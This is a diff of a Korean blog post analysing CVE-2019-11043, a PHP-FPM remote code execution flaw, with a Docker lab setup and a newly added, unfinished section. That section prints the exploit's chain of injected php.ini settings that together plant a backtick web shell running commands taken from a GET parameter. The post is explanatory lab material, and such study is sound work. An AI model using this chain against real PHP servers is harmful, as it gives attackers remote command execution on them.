@@ -38,7 +38,7 @@ PHP-FPM(FastCGI Process Manager)은 동적 페이지를 빠르게 처리하기 �
 [test@localhost test]$ git pull origin master
 [test@localhost test]$ mv -v CVE-2019-11043/ /home/유저아이디/Desktop/
 [test@localhost test]$ rm -rf test
-[test@localhost CVE-2019-11043]$ sudo docker-compose up -d
+[test@localhost CVE-2019-11043]$ sudo docker-compose up -d # 도커는 계정별 설치. 일반 사용자에 설치했다면 sudo를 빼보자
 ```
 
 ![](https://chanbin.github.io/assets/img/php-fpm/2.png)
@@ -185,6 +185,32 @@ location ~ [^/]\.php(/|$){
 
 > 출처 : https://blog.orange.tw/2019/10/an-analysis-and-thought-about-recently.html 
 > 출처 : https://github.com/php/php-src/blob/5d6e923d46a89fe9cd8fb6c3a6da675aa67197b4/main/fastcgi.c#L1703
+
+<br>
+<br>
+
+작성중...
+
+공격 체인
+```php
+var chain = []string{
+	"short_open_tag=1", // php태그를 <?php 대신에 <?로 줄여서 사용, 문자열 탐지 우회 가능, 문자열 길이 축소
+	"html_errors=0", // 에러 메세지에 HTML태그 추가여부 설정, off, 성공만 간단히 보려고
+	"include_path=/tmp", // fopen_with_path() 등 다양한 함수가 파일을 찾는 기본 디렉토리
+	"auto_prepend_file=a", // HTML 문서 전후에 추가할 파일설정
+	"log_errors=1", // 로그파일에 에러로그 기록하도록 설정
+	"error_reporting=2", // 에러로그 E_ERROR(2)만 기록하도록 설정
+	"error_log=/tmp/a", // "/tmp/a" 파일에 에러 기록
+	"extension_dir=\"<?=`\"", // 확장모듈 디렉토리 설정
+	"extension=\"$_GET[a]`?>\"", // 해당 디렉토리에서 PHP가 시작할 때, 읽어들일 모듈 설정
+}
+```
+extension_dir = "<?=\`" <br>
+extension = "$\_GET[a]\`?>" <br>
+두개를 더하면 = "<?=\`$\_GET[a]\`?>"
+이 backticks(\`) 문자들로 감싸진 문자열은, shell command로 실행하고, 결과값을 화면에 출력한다.
+
+php.ini파일에서 extension 모듈을 추가하는 방식은, SAPI(서버 어플리케이션 프로그래밍 인터페이스)에서 각 extension의 코드를 로드하고 모듈 초기화 루틴(MINIT)을 호출한다. 이 과정에서 PHP에 extension의 코드가 등록이 되는 것이다.
 
 <br>
 <br>
